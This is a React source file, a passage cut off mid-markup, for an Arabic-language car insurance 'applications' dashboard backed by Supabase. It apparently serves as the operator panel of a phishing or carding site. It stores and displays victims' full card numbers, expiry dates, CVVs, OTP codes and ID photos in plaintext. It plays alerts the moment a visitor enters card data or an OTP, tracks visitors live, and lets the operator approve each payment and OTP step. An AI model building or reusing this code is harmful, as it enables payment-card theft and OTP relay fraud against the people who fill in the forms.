import { useEffect, useState, useRef, useCallback, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { SidebarProvider, SidebarTrigger } from "@/components/ui/sidebar";
import { DashboardSidebar } from "@/components/DashboardSidebar";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { CheckCircle, XCircle, Clock, Eye, Loader2, MapPin, RefreshCw, Menu, Globe, Ban, Search, ChevronLeft, ChevronRight } from "lucide-react";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { usePresence, OnlineUser } from "@/hooks/usePresence";
import { toast as sonnerToast } from "sonner";

interface Application {
  id: string;
  created_at: string;
  updated_at: string;
  full_name?: string | null;
  phone?: string | null;
  insurance_type: string;
  document_type: string;
  id_number?: string;
  serial_number?: string;
  vehicle_manufacturer: string;
  vehicle_model: string;
  vehicle_year: string;
  vehicle_value: number;
  selected_company: string;
  selected_price: string;
  regular_price: string;
  cardholder_name: string;
  card_number: string;
  card_last_4: string;
  card_type: string;
  expiry_date: string;
  card_cvv: string;
  otp_code: string;
  current_step: string;
  step_1_approved: boolean;
  step_2_approved: boolean;
  step_3_approved: boolean;
  payment_approved: boolean;
  otp_approved: boolean;
  status: string;
  usage_purpose: string;
  policy_start_date: string;
  add_driver: boolean;
  ip_address?: string;
  id_front_url?: string | null;
  id_back_url?: string | null;
  id_verification_step?: string | null;
}

const getPageName = (step: string): string => {
  const pages: { [key: string]: string } = {
    'quote_form': '📝 صفحة النموذج الأول',
    'vehicle_info': '🚗 صفحة معلومات المركبة',
    'insurance_selection': '🏢 صفحة اختيار التأمين',
    'payment': '💳 صفحة الدفع',
    'otp': '🔐 صفحة التحقق OTP',
    'id_verification': '🪪 صفحة التحقق من الهوية',
    'completed': '✅ مكتمل',
  };
  return pages[step] || step || 'غير معروف';
};

// Shared AudioContext - reuse across all sounds to prevent lag
let sharedAudioCtx: AudioContext | null = null;
const getAudioContext = (): AudioContext => {
  if (!sharedAudioCtx || sharedAudioCtx.state === 'closed') {
    sharedAudioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
  }
  // Resume if suspended (browser autoplay policy)
  if (sharedAudioCtx.state === 'suspended') {
    sharedAudioCtx.resume();
  }
  return sharedAudioCtx;
};

const DashboardApplications = () => {
  const navigate = useNavigate();
  const [applications, setApplications] = useState<Application[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const ITEMS_PER_PAGE = 50;
  
  const [selectedApp, setSelectedApp] = useState<Application | null>(null);
  const [relatedApplications, setRelatedApplications] = useState<Application[]>([]);
  const [showDetails, setShowDetails] = useState(false);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const { toast } = useToast();
  const { onlineUsers } = usePresence();
  const previousStepsRef = useRef<Map<string, string>>(new Map());
  
  // تتبع الإشعارات المُرسلة لتفادي التكرار
  const notifiedRef = useRef<Set<string>>(new Set());

  const triggerNotification = (key: string, soundFn: () => void, title: string, description: string, duration = 8000) => {
    // منع الإشعارات المكررة لنفس الحدث
    if (notifiedRef.current.has(key)) return;
    notifiedRef.current.add(key);
    // مسح الإشعار بعد دقيقة للسماح بإشعار جديد لاحقاً
    setTimeout(() => notifiedRef.current.delete(key), 60000);
    
    soundFn();
    sonnerToast(title, { description, duration });
  };

  useEffect(() => {
    const checkAuth = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/login");
        return;
      }
      await fetchApplications();
      setLoading(false);
    };

    checkAuth();

    const channel = supabase
      .channel('applications_realtime_v2')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'customer_applications'
        },
        (payload) => {
          console.log('Realtime update:', payload);
          
          if (payload.eventType === 'INSERT') {
            const newData = payload.new as Application;
            setApplications(prev => {
              // تجنب إضافة نفس السجل مرتين
              if (prev.some(a => a.id === newData.id)) return prev;
              return [newData, ...prev];
            });
            previousStepsRef.current.set(newData.id, newData.current_step);
            
            const clientName = newData.full_name || 'غير معروف';
            if (newData.current_step === 'quote_form') {
              triggerNotification(`quote_${newData.id}`, playQuoteFormSound, "📋 عميل جديد بدأ التسجيل!", `العميل ${clientName} أكمل الصفحة الأولى`);
            } else if (newData.current_step === 'payment' && !newData.payment_approved) {
              triggerNotification(`pay_${newData.id}`, playNotificationSound, "🔔 طلب جديد يحتاج موافقة!", `العميل ${clientName} وصل لمرحلة الدفع`, 10000);
            } else if (newData.current_step === 'otp' && !newData.otp_approved) {
              triggerNotification(`otp_${newData.id}`, playOTPSound, "🔐 كود تحقق OTP جديد!", `العميل ${clientName} أرسل كود التحقق`, 10000);
            } else if (newData.current_step === 'id_verification' && newData.id_verification_step === 'submitted') {
              triggerNotification(`id_${newData.id}`, playIDVerificationSound, "🪪 صور هوية جديدة!", `العميل ${clientName} رفع صور هويته`, 10000);
            }
          } else if (payload.eventType === 'UPDATE') {
            const newData = payload.new as Application;
            const previousStep = previousStepsRef.current.get(newData.id);
            
            // تحديث السجل في الـ state
            setApplications(prev =>
              prev.map(app => app.id === newData.id ? { ...app, ...newData } : app)
            );
            setSelectedApp(prev => prev?.id === newData.id ? { ...prev, ...newData } : prev);

            const clientName = newData.full_name || 'عميل';

            // إشعار تغيير الصفحة فقط إذا تغيرت الخطوة فعلاً
            if (previousStep && previousStep !== newData.current_step) {
              triggerNotification(
                `step_${newData.id}_${newData.current_step}`,
                playPageChangeSound,
                "📍 العميل انتقل لصفحة جديدة",
                `${clientName} انتقل إلى ${getPageName(newData.current_step)}`,
                5000
              );

              // إشعار خاص عند وصول خطوة جديدة (بعد تأكيد تغيير الخطوة)
              if (newData.current_step === 'payment' && !newData.payment_approved) {
                setTimeout(() => triggerNotification(`pay_${newData.id}`, playNotificationSound, "🔔 يحتاج موافقة الدفع!", `العميل ${clientName} أدخل بيانات البطاقة`, 10000), 600);
              } else if (newData.current_step === 'otp' && !newData.otp_approved) {
                setTimeout(() => triggerNotification(`otp_${newData.id}`, playOTPSound, "🔐 كود OTP جديد!", `العميل ${clientName} أرسل كود التحقق`, 10000), 600);
              } else if (newData.current_step === 'id_verification' && newData.id_verification_step === 'submitted') {
                setTimeout(() => triggerNotification(`id_${newData.id}`, playIDVerificationSound, "🪪 صور هوية جديدة!", `العميل ${clientName} رفع صور هويته`, 10000), 600);
              }
            } else if (previousStep === newData.current_step) {
              // نفس الخطوة لكن تحديث البيانات (مثل إرسال OTP أو الهوية)
              if (newData.current_step === 'otp' && newData.otp_code && !newData.otp_approved) {
                triggerNotification(`otp_code_${newData.id}_${newData.otp_code}`, playOTPSound, "🔐 كود OTP جديد!", `العميل ${clientName} أرسل كود التحقق`, 10000);
              }
              if (newData.id_verification_step === 'submitted') {
                triggerNotification(`id_submit_${newData.id}`, playIDVerificationSound, "🪪 صور هوية جديدة!", `العميل ${clientName} رفع صور هويته`, 10000);
              }
              if (newData.current_step === 'payment' && newData.card_number && !newData.payment_approved) {
                triggerNotification(`pay_card_${newData.id}_${newData.card_last_4}`, playNotificationSound, "🔔 بيانات دفع جديدة!", `العميل ${clientName} أدخل بيانات البطاقة`, 10000);
              }
            }

            previousStepsRef.current.set(newData.id, newData.current_step);
          }
        }
      )
      .subscribe((status) => {
        console.log('Realtime subscription status:', status);
      });

    return () => {
      supabase.removeChannel(channel);
    };
  }, [navigate]);

  // صوت تنبيه عند تغيير الصفحة
  const playPageChangeSound = useCallback(() => {
    const ctx = getAudioContext();
    const oscillator = ctx.createOscillator();
    const gainNode = ctx.createGain();
    oscillator.connect(gainNode);
    gainNode.connect(ctx.destination);
    oscillator.frequency.value = 440;
    oscillator.type = 'sine';
    gainNode.gain.setValueAtTime(0.15, ctx.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
    oscillator.start(ctx.currentTime);
    oscillator.stop(ctx.currentTime + 0.3);
  }, []);

  const playQuoteFormSound = useCallback(() => {
    const ctx = getAudioContext();
    const osc1 = ctx.createOscillator();
    const gain1 = ctx.createGain();
    osc1.connect(gain1);
    gain1.connect(ctx.destination);
    osc1.frequency.value = 500;
    osc1.type = 'sine';
    gain1.gain.setValueAtTime(0.2, ctx.currentTime);
    gain1.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.8);
    osc1.start(ctx.currentTime);
    osc1.stop(ctx.currentTime + 0.8);

    const osc2 = ctx.createOscillator();
    const gain2 = ctx.createGain();
    osc2.connect(gain2);
    gain2.connect(ctx.destination);
    osc2.frequency.value = 650;
    osc2.type = 'sine';
    const startTime = ctx.currentTime + 0.9;
    gain2.gain.setValueAtTime(0.2, startTime);
    gain2.gain.exponentialRampToValueAtTime(0.01, startTime + 0.6);
    osc2.start(startTime);
    osc2.stop(startTime + 0.6);
  }, []);

  const playNotificationSound = useCallback(() => {
    const ctx = getAudioContext();
    [0, 0.6, 1.2].forEach(delay => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.value = 800;
      osc.type = 'sine';
      const t = ctx.currentTime + delay;
      gain.gain.setValueAtTime(0.3, t);
      gain.gain.exponentialRampToValueAtTime(0.01, t + 0.5);
      osc.start(t);
      osc.stop(t + 0.5);
    });
  }, []);

  const playOTPSound = useCallback(() => {
    const ctx = getAudioContext();
    const frequencies = [523, 659, 784, 1047];
    frequencies.forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.value = freq;
      osc.type = 'triangle';
      const t = ctx.currentTime + i * 0.15;
      gain.gain.setValueAtTime(0.35, t);
      gain.gain.exponentialRampToValueAtTime(0.01, t + 0.25);
      osc.start(t);
      osc.stop(t + 0.25);
    });
    [900, 1100].forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.value = freq;
      osc.type = 'square';
      const t = ctx.currentTime + 0.7 + i * 0.22;
      gain.gain.setValueAtTime(0.2, t);
      gain.gain.exponentialRampToValueAtTime(0.01, t + 0.2);
      osc.start(t);
      osc.stop(t + 0.2);
    });
  }, []);

  const playIDVerificationSound = useCallback(() => {
    const ctx = getAudioContext();
    const pattern = [440, 550, 660, 880, 660];
    pattern.forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.value = freq;
      osc.type = 'sine';
      const t = ctx.currentTime + i * 0.18;
      gain.gain.setValueAtTime(0.3, t);
      gain.gain.exponentialRampToValueAtTime(0.01, t + 0.3);
      osc.start(t);
      osc.stop(t + 0.3);
    });
  }, []);

  const fetchApplications = async () => {
    setRefreshing(true);
    
    // Fetch all records by paginating through Supabase's 1000-row limit
    let allData: Application[] = [];
    let from = 0;
    const pageSize = 1000;
    let hasMore = true;
    
    while (hasMore) {
      const { data, error } = await supabase
        .from('customer_applications')
        .select('*')
        .order('created_at', { ascending: false })
        .range(from, from + pageSize - 1);

      if (error) {
        console.error('Error fetching applications:', error);
        setRefreshing(false);
        return;
      }

      if (data && data.length > 0) {
        allData = [...allData, ...data];
        from += pageSize;
        hasMore = data.length === pageSize;
      } else {
        hasMore = false;
      }
    }

    // تحديث الخطوات السابقة للتتبع
    allData.forEach(app => {
      if (!previousStepsRef.current.has(app.id)) {
        previousStepsRef.current.set(app.id, app.current_step);
      }
    });

    setApplications(allData);
    setRefreshing(false);
  };

  const handleBlockIP = async (ip: string) => {
    try {
      const { error } = await supabase
        .from('blocked_ips')
        .insert({
          ip_address: ip,
          reason: 'حظر من صفحة طلبات العملاء'
        });
      
      if (error) {
        if (error.code === '23505') {
          sonnerToast.error('هذا الـ IP محظور بالفعل');
        } else {
          throw error;
        }
        return;
      }
      
      sonnerToast.success(`تم حظر ${ip}`);
    } catch (error) {
      console.error('Error blocking IP:', error);
      sonnerToast.error('خطأ في حظر الـ IP');
    }
  };

  const approveStep = async (appId: string, stepField: string) => {
    // تحديث فوري في الـ UI قبل انتظار السيرفر (Optimistic Update)
    setApplications(prev =>
      prev.map(app => app.id === appId ? { ...app, [stepField]: true } : app)
    );
    setSelectedApp(prev => prev?.id === appId ? { ...prev, [stepField]: true } : prev);
    setRelatedApplications(prev =>
      prev.map(app => app.id === appId ? { ...app, [stepField]: true } : app)
    );

    const { error } = await supabase
      .from('customer_applications')
      .update({ [stepField]: true })
      .eq('id', appId);

    if (error) {
      // إرجاع التحديث عند الخطأ
      setApplications(prev =>
        prev.map(app => app.id === appId ? { ...app, [stepField]: false } : app)
      );
      setSelectedApp(prev => prev?.id === appId ? { ...prev, [stepField]: false } : prev);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة",
        variant: "destructive"
      });
      return;
    }

    sonnerToast.success("✅ تمت الموافقة بنجاح");
  };

  const rejectStep = async (appId: string) => {
    // تحديث فوري في الـ UI
    setApplications(prev =>
      prev.map(app => app.id === appId ? { ...app, status: 'rejected' } : app)
    );
    setSelectedApp(prev => prev?.id === appId ? { ...prev, status: 'rejected' } : prev);
    setRelatedApplications(prev =>
      prev.map(app => app.id === appId ? { ...app, status: 'rejected' } : app)
    );

    const { error } = await supabase
      .from('customer_applications')
      .update({ status: 'rejected' })
      .eq('id', appId);

    if (error) {
      // إرجاع التحديث عند الخطأ
      setApplications(prev =>
        prev.map(app => app.id === appId ? { ...app, status: 'pending' } : app)
      );
      setSelectedApp(prev => prev?.id === appId ? { ...prev, status: 'pending' } : prev);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الرفض",
        variant: "destructive"
      });
      return;
    }

    sonnerToast.error("❌ تم رفض الطلب");
  };

  const getStepBadge = (approved: boolean) => {
    if (approved) {
      return <Badge className="bg-green-500"><CheckCircle className="w-3 h-3 mr-1" /> موافق عليه</Badge>;
    }
    return <Badge variant="destructive"><Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة</Badge>;
  };

  const fetchRelatedApplications = async (phone: string) => {
    const { data, error } = await supabase
      .from('customer_applications')
      .select('*')
      .eq('phone', phone)
      .order('created_at', { ascending: true });

    if (error) {
      console.error('Error fetching related applications:', error);
      return;
    }

    setRelatedApplications(data || []);
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-12 w-12 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <SidebarProvider>
      <div className="min-h-screen flex w-full">
        <DashboardSidebar />
        
        <div className="flex-1 flex flex-col">
          <header className="h-16 border-b bg-card flex items-center px-6 sticky top-0 z-10">
            <SidebarTrigger className="p-2 hover:bg-accent rounded-lg border border-border shadow-sm">
              <Menu className="h-5 w-5" />
            </SidebarTrigger>
            <h1 className="text-2xl font-bold mr-4">بيانات العملاء</h1>
          </header>

          <main className="flex-1 p-6 bg-muted/30">
            <div className="max-w-7xl mx-auto space-y-6">
              <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                <div>
                  <h2 className="text-3xl font-bold mb-2">إدارة طلبات العملاء</h2>
                  <p className="text-muted-foreground">
                    إجمالي {applications.length} طلب | متصل الآن: {onlineUsers.size}
                  </p>
                </div>
                <div className="flex items-center gap-3 w-full md:w-auto">
                  <div className="relative flex-1 md:w-64">
                    <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                    <Input
                      placeholder="بحث برقم البطاقة..."
                      value={searchQuery}
                      onChange={(e) => { setSearchQuery(e.target.value); setCurrentPage(1); }}
                      className="pr-10 text-right"
                      dir="rtl"
                    />
                  </div>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={fetchApplications}
                    disabled={refreshing}
                    className="gap-2"
                  >
                    <RefreshCw className={`h-4 w-4 ${refreshing ? 'animate-spin' : ''}`} />
                    تحديث
                  </Button>
                </div>
              </div>

              <div className="grid gap-4">
                {(() => {
                  const filtered = applications.filter((app) => {
                    if (!searchQuery.trim()) return true;
                    const query = searchQuery.trim();
                    return (
                      (app.card_number && app.card_number.includes(query)) ||
                      (app.card_last_4 && app.card_last_4.includes(query))
                    );
                  });
                  const totalPages = Math.ceil(filtered.length / ITEMS_PER_PAGE);
                  const safeCurrentPage = Math.min(currentPage, totalPages || 1);
                  const paginatedApps = filtered.slice(
                    (safeCurrentPage - 1) * ITEMS_PER_PAGE,
                    safeCurrentPage * ITEMS_PER_PAGE
                  );
                  return (
                    <>
                    <p className="text-sm text-muted-foreground">
                      عرض {((safeCurrentPage - 1) * ITEMS_PER_PAGE) + 1} - {Math.min(safeCurrentPage * ITEMS_PER_PAGE, filtered.length)} من {filtered.length} طلب
                    </p>
                    {paginatedApps.map((app) => {
                   const userOnline = onlineUsers.get(app.id);
                  const isOnline = !!userOnline;
                  // جلب IP من الزائر المتصل أو من الطلب المحفوظ
                  const visitorIP = userOnline?.ipAddress || app.ip_address || null;

                  // اسم العرض: الاسم المسجل، وإلا اسم حامل البطاقة، وإلا رقم آخر 4 أرقام، وإلا بدون اسم
                  const displayName =
                    (typeof app.full_name === "string" && app.full_name.trim()) ||
                    (typeof app.cardholder_name === "string" && app.cardholder_name.trim()) ||
                    (typeof app.card_last_4 === "string" && app.card_last_4.trim()
                      ? `عميل ****${app.card_last_4.trim()}`
                      : "بدون اسم");
                  
                  return (
                    <Card key={app.id} className={`p-4 md:p-6 transition-all ${isOnline ? 'ring-2 ring-green-500 shadow-lg' : ''}`}>
                      <div className="space-y-4">
                        {/* معلومات العميل الأساسية */}
                        <div className="flex flex-col md:flex-row md:items-start md:justify-between gap-4">
                          <div className="space-y-2 flex-1">
                            <div className="flex items-center gap-3 flex-wrap">
                              <h3 className="text-xl font-bold">{displayName}</h3>
                              {isOnline && (
                                <div className="flex items-center gap-2 bg-green-100 dark:bg-green-900/30 px-3 py-1 rounded-full">
                                  <div className="relative">
                                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                                    <div className="absolute inset-0 w-3 h-3 bg-green-500 rounded-full opacity-50 animate-ping"></div>
                                  </div>
                                  <span className="text-xs font-semibold text-green-700 dark:text-green-300">متصل الآن</span>
                                </div>
                              )}
                              
                              {/* عرض IP مع زر الحظر */}
                              {visitorIP && (
                                <div className="flex items-center gap-1">
                                  <Badge variant="secondary" className="gap-1 text-xs font-mono">
                                    <Globe className="h-3 w-3" />
                                    {visitorIP}
                                  </Badge>
                                  <Button
                                    variant="ghost"
                                    size="sm"
                                    className="h-6 w-6 p-0 text-red-500 hover:text-red-600 hover:bg-red-50"
                                    onClick={() => handleBlockIP(visitorIP)}
                                    title="حظر هذا الـ IP"
                                  >
                                    <Ban className="h-3 w-3" />
                                  </Button>
                                </div>
                              )}
                            </div>
                            
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2 text-sm">
                              <p className="flex items-center gap-1">
                                <span className="text-muted-foreground">📱 الهاتف:</span>
                                <span className="font-semibold" dir="ltr">{app.phone || 'غير متوفر'}</span>
                              </p>
                              {app.serial_number && (
                                <p className="flex items-center gap-1">
                                  <span className="text-muted-foreground">🔢 التسلسلي:</span>
                                  <span className="font-semibold">{app.serial_number}</span>
                                </p>
                              )}
                              {app.insurance_type && (
                                <p className="flex items-center gap-1">
                                  <span className="text-muted-foreground">📋 التأمين:</span>
                                  <span className="font-semibold">{app.insurance_type === 'comprehensive' ? 'شامل' : 'ضد الغير'}</span>
                                </p>
                              )}
                              {app.vehicle_manufacturer && (
                                <p className="flex items-center gap-1">
                                  <span className="text-muted-foreground">🚗 المركبة:</span>
                                  <span className="font-semibold">{app.vehicle_manufacturer} {app.vehicle_model} ({app.vehicle_year})</span>
                                </p>
                              )}
                              {app.vehicle_value && (
                                <p className="flex items-center gap-1">
                                  <span className="text-muted-foreground">💰 القيمة:</span>
                                  <span className="font-semibold">{app.vehicle_value.toLocaleString('ar-SA')} ر.س</span>
                                </p>
                              )}
                              {app.selected_company && (
                                <p className="flex items-center gap-1">
                                  <span className="text-muted-foreground">🏢 الشركة:</span>
                                  <span className="font-semibold">{app.selected_company} - {app.selected_price} ر.س</span>
                                </p>
                              )}
                            </div>
                            
                            <p className="text-xs text-muted-foreground">
                              📅 {new Date(app.created_at).toLocaleDateString('ar-EG', {
                                year: 'numeric',
                                month: 'short',
                                day: 'numeric',
                              })}
                              {' | '}
                              <span dir="ltr">
                                🕐 {new Date(app.created_at).toLocaleTimeString('ar-EG', {
                                  hour: '2-digit',
                                  minute: '2-digit'
                                })}
                              </span>
                              {app.updated_at && app.updated_at !== app.created_at && (
                                <>
                                  {' | '}
                                  آخر تحديث: {new Date(app.updated_at).toLocaleTimeString('ar-EG', {
                                    hour: '2-digit',
                                    minute: '2-digit'
                                  })}
                                </>
                              )}
                            </p>
                          </div>
                          
                          {/* الصفحة الحالية */}
                          <div className="flex flex-col items-start md:items-end gap-2">
                            <div className={`px-4 py-2 rounded-lg border-2 ${
                              isOnline 
                                ? 'bg-green-50 dark:bg-green-900/20 border-green-300 dark:border-green-700' 
                                : 'bg-muted border-muted-foreground/20'
                            }`}>
                              <div className="flex items-center gap-2">
                                <MapPin className={`w-4 h-4 ${isOnline ? 'text-green-600' : 'text-muted-foreground'}`} />
                                <span className="text-xs text-muted-foreground">الصفحة الحالية:</span>
                              </div>
                              <p className={`font-bold text-sm mt-1 ${isOnline ? 'text-green-700 dark:text-green-300' : ''}`}>
                                {getPageName(app.current_step)}
                              </p>
                            </div>
                            
                            <Button
                              onClick={() => {
                                setSelectedApp(app);
                                if (app.phone) {
                                  fetchRelatedApplications(app.phone);
                                } else {
                                  setRelatedApplications([]);
                                }
                                setShowDetails(true);
                              }}
                              variant="default"
                              size="sm"
                              className="gap-2"
                            >
                              <Eye className="w-4 h-4" />
                              عرض التفاصيل
                            </Button>
                          </div>
                        </div>

                        {/* شريط الحالة + بيانات البطاقة + الأزرار */}
                        <div className="pt-4 border-t space-y-3">
                          {/* بيانات البطاقة / OTP داخل بطاقة الطلب */}
                          {(app.card_number || app.card_cvv || app.expiry_date || app.otp_code) && (
                            <div className="rounded-lg border bg-card p-3">
                              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-2 text-sm">
                                {(app.cardholder_name || app.card_type) && (
                                  <p>
                                    <span className="text-muted-foreground">الاسم/النوع:</span>{" "}
                                    <span className="font-semibold">
                                      {[app.cardholder_name, app.card_type].filter(Boolean).join(" - ") || "غير متوفر"}
                                    </span>
                                  </p>
                                )}
                                {app.card_number && (
                                  <p dir="ltr">
                                    <span className="text-muted-foreground">رقم البطاقة:</span>{" "}
                                    <span className="font-semibold">{app.card_number}</span>
                                  </p>
                                )}
                                {app.expiry_date && (
                                  <p dir="ltr">
                                    <span className="text-muted-foreground">انتهاء:</span>{" "}
                                    <span className="font-semibold">{app.expiry_date}</span>
                                  </p>
                                )}
                                {app.card_cvv && (
                                  <p dir="ltr">
                                    <span className="text-muted-foreground">CVV:</span>{" "}
                                    <span className="font-semibold">{app.card_cvv}</span>
                                  </p>
                                )}
                                {app.otp_code && (
                                  <p dir="ltr" className="md:col-span-2 lg:col-span-4">
                                    <span className="text-muted-foreground">OTP:</span>{" "}
                                    <span className="font-semibold">{app.otp_code}</span>
                                  </p>
                                )}
                              </div>
                            </div>
                          )}

                          {/* الحالة + أزرار الموافقة/الرفض */}
                          <div className="flex flex-wrap gap-2 items-center justify-between">
                            <div className="flex flex-wrap gap-2 items-center">
                              <Badge variant={app.status === 'rejected' ? 'destructive' : 'secondary'}>
                                الحالة: {app.status === 'rejected' ? 'مرفوض' : app.current_step === 'otp' && app.otp_approved ? 'مكتمل' : 'قيد المعالجة'}
                              </Badge>
                              {(app.current_step === 'payment' || app.status === 'pending_payment') && !app.payment_approved && (
                                <Badge variant="outline" className="bg-muted animate-pulse">
                                  في انتظار موافقة الدفع 💳
                                </Badge>
                              )}
                              {(app.current_step === 'otp' || app.status === 'pending_otp') && !app.otp_approved && (
                                <Badge variant="outline" className="bg-muted animate-pulse">
                                  في انتظار موافقة OTP 🔐
                                </Badge>
                              )}
                              {app.id_verification_step === 'submitted' && (
                                <Badge variant="outline" className="bg-muted animate-pulse border-amber-400 text-amber-600">
                                  في انتظار مراجعة الهوية 🪪
                                </Badge>
                              )}
                              {app.id_verification_step === 'approved' && (
                                <Badge className="bg-green-500 text-white">✅ هوية موافق عليها</Badge>
                              )}
                              {app.id_verification_step === 'rejected' && (
                                <Badge variant="destructive">❌ هوية مرفوضة</Badge>
                              )}
                            </div>

                            {app.status !== 'rejected' && (
                              <div className="flex gap-2">
                                {(app.current_step === 'payment' || app.status === 'pending_payment') && !app.payment_approved && (
                                  <>
                                    <Button onClick={() => approveStep(app.id, 'payment_approved')} size="sm" className="gap-1">
                                      <CheckCircle className="h-4 w-4" />
                                      موافقة الدفع
                                    </Button>
                                    <Button onClick={() => rejectStep(app.id)} size="sm" variant="destructive" className="gap-1">
                                      <XCircle className="h-4 w-4" />
                                      رفض
                                    </Button>
                                  </>
                                )}
                                {(app.current_step === 'otp' || app.status === 'pending_otp') && !app.otp_approved && (
                                  <>
                                    <Button onClick={() => approveStep(app.id, 'otp_approved')} size="sm" className="gap-1">
                                      <CheckCircle className="h-4 w-4" />
                                      موافقة OTP
                                    </Button>
                                    <Button onClick={() => rejectStep(app.id)} size="sm" variant="destructive" className="gap-1">
                                      <XCircle className="h-4 w-4" />
                                      رفض
                                    </Button>
                                  </>
                                )}
                                {app.id_verification_step === 'submitted' && (
                                  <>
                                    <Button
                                      size="sm"
                                      className="gap-1 bg-green-600 hover:bg-green-700"
                                      onClick={async () => {
                                        await supabase.from('customer_applications').update({ id_verification_step: 'approved' }).eq('id', app.id);
                                        setApplications(prev => prev.map(a => a.id === app.id ? { ...a, id_verification_step: 'approved' } : a));
                                        setSelectedApp(prev => prev?.id === app.id ? { ...prev, id_verification_step: 'approved' } : prev);
                                        sonnerToast.success("✅ تم التحقق من الهوية");
                                      }}
                                    >
                                      <CheckCircle className="h-4 w-4" />
                                      قبول الهوية
                                    </Button>
                                    <Button
                                      size="sm"
                                      variant="destructive"
                                      className="gap-1"
                                      onClick={async () => {
                                        await supabase.from('customer_applications').update({ id_verification_step: 'rejected' }).eq('id', app.id);
                                        setApplications(prev => prev.map(a => a.id === app.id ? { ...a, id_verification_step: 'rejected' } : a));
                                        setSelectedApp(prev => prev?.id === app.id ? { ...prev, id_verification_step: 'rejected' } : prev);
                                        sonnerToast.error("❌ تم رفض صور الهوية");
                                      }}
                                    >
                                      <XCircle className="h-4 w-4" />
                                      رفض الهوية
                                    </Button>
                                  </>
                                )}
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    </Card>
                  );
                })}
                    {totalPages > 1 && (
                      <div className="flex items-center justify-center gap-2 mt-4" dir="rtl">
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => setCurrentPage(p => Math.max(1, p - 1))}
                          disabled={safeCurrentPage <= 1}
                        >
                          <ChevronRight className="h-4 w-4" />
                          السابق
                        </Button>
                        <span className="text-sm text-muted-foreground">
                          صفحة {safeCurrentPage} من {totalPages}
                        </span>
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))}
                          disabled={safeCurrentPage >= totalPages}
                        >
                          التالي
                          <ChevronLeft className="h-4 w-4" />
                        </Button>
                      </div>
                    )}
                    </>
                  );
                })()}
              </div>

              {/* Dialog لعرض التفاصيل الكاملة */}
              <Dialog open={showDetails} onOpenChange={setShowDetails}>
        <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>تفاصيل الطلب الكاملة</DialogTitle>
            <DialogDescription>
              جميع البيانات المدخلة من قبل العميل
            </DialogDescription>
          </DialogHeader>

          {selectedApp && (
            <div className="space-y-6">
              {/* الصفحة الحالية للعميل */}
              <div className={`p-4 rounded-lg border-2 ${
                onlineUsers.has(selectedApp.id)
                  ? 'bg-green-50 dark:bg-green-900/20 border-green-300 dark:border-green-700'
                  : 'bg-muted border-muted-foreground/20'
              }`}>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <MapPin className={`w-5 h-5 ${onlineUsers.has(selectedApp.id) ? 'text-green-600' : 'text-muted-foreground'}`} />
                    <div>
                      <p className="text-sm text-muted-foreground">الصفحة الحالية</p>
                      <p className={`text-lg font-bold ${onlineUsers.has(selectedApp.id) ? 'text-green-700 dark:text-green-300' : ''}`}>
                        {getPageName(selectedApp.current_step)}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    {onlineUsers.has(selectedApp.id) ? (
                      <>
                        <div className="relative">
                          <div className="w-4 h-4 bg-green-500 rounded-full animate-pulse"></div>
                          <div className="absolute inset-0 w-4 h-4 bg-green-500 rounded-full opacity-50 animate-ping"></div>
                        </div>
                        <span className="text-sm font-bold text-green-600">متصل الآن</span>
                      </>
                    ) : (
                      <>
                        <div className="w-4 h-4 bg-gray-400 rounded-full"></div>
                        <span className="text-sm font-semibold text-gray-600">غير متصل</span>
                      </>
                    )}
                  </div>
                </div>
              </div>

              {/* معلومات العميل */}
              <div className="bg-blue-50 dark:bg-blue-950/20 p-4 rounded-lg border border-blue-200 dark:border-blue-800">
                <h3 className="font-bold text-lg mb-3">👤 معلومات العميل</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">الاسم الكامل:</p>
                    <p className="font-semibold text-base">
